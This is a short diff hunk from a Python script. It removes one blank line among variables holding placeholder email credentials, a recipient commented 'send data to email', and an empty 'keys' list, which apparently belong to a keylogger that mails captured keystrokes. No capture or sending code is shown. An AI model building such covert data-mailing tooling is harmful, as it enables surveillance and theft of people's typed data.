@@ -35,7 +35,6 @@ email_add = "abc@gmail.com" # your email address
 passwo = "password" # Password
 
 toaddrecv = "xyz@gmail.com" # send data to email
-
 count = 0
 keys = []
 
